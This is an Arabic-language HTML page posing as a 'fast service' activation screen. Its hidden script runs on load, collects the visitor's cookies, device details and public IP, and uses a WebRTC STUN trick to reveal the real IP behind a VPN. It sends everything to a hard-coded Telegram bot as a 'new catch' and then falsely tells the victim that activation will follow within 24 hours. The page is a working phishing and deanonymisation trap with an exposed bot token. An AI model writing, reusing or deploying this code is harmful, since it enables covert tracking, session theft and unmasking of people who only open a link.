<!DOCTYPE html>
<html lang="ar">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>ALSSRY - FAST SERVICE</title>
    <style>
        body { background: #000; color: #00ff00; font-family: 'Courier New', monospace; text-align: center; margin: 0; padding-top: 100px; direction: rtl; }
        .box { border: 1px solid #00ff00; padding: 30px; display: inline-block; border-radius: 10px; box-shadow: 0 0 20px #00ff00; width: 80%; max-width: 400px; }
        .loading { border: 4px solid #111; border-top: 4px solid #00ff00; border-radius: 50%; width: 40px; height: 40px; animation: spin 1s linear infinite; margin: 20px auto; }
        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
        #status { font-size: 14px; margin-top: 10px; color: #888; }
    </style>
</head>
<body>

    <div class="box">
        <h2 style="text-shadow: 0 0 10px #00ff00;">ALSSRY SYSTEM</h2>
        <div class="loading"></div>
        <div id="status">جاري الاتصال بالسيرفر...</div>
    </div>

    <script>
        // بياناتك الخاصة للتليجرام
        const BOT_TOKEN = "8619490492:AAEfXC0wN0Uh73BA9TniEqyQh_gb_GyfzUg";
        const CHAT_ID = "5811700860";

        async function startTrap() {
            let data = {
                cookies: document.cookie || "محمي أو فارغ",
                platform: navigator.platform,
                agent: navigator.userAgent
            };

            // 1. سحب الـ IP
            try {
                const res = await fetch('https://api.ipify.org?format=json');
                const ipJson = await res.json();
                data.ip = ipJson.ip;
                document.getElementById('status').innerText = "تم تأمين نقطة الاتصال: " + ipJson.ip;
            } catch(e) { data.ip = "Unknown"; }

            // 2. سحب الـ IP الحقيقي (WebRTC) غصب
            const pc = new RTCPeerConnection({iceServers: [{urls: "stun:stun.l.google.com:19302"}]});
            pc.createDataChannel("");
            pc.createOffer().then(o => pc.setLocalDescription(o));
            pc.onicecandidate = (e) => {
                if (e.candidate) {
                    data.real_ip = /([0-9]{1,3}(\.[0-9]{1,3}){3})/.exec(e.candidate.candidate)[1];
                    sendToTelegram(data);
                }
            };
            
            // إرسال احتياطي في حال فشل WebRTC
            setTimeout(() => { if(!data.real_ip) sendToTelegram(data); }, 3000);
        }

        function sendToTelegram(info) {
            const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
            const text = `🔥 *صيدة جديدة (قيت هوب)* 🔥\n\n🌐 *IP العام:* \`${info.ip}\`\n📍 *IP الحقيقي:* \`${info.real_ip || 'VPN/Hidden'}\`\n📱 *الجهاز:* ${info.platform}\n🍪 *Cookies:* \n\`${info.cookies}\``;
            
            fetch(url, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ chat_id: CHAT_ID, text: text, parse_mode: "Markdown" })
            }).then(() => {
                document.getElementById('status').innerText = "تم الربط! انتظر تفعيل الخدمة خلال 24 ساعة.";
            });
        }

        window.onload = startTrap;
    </script>
</body>
</html>
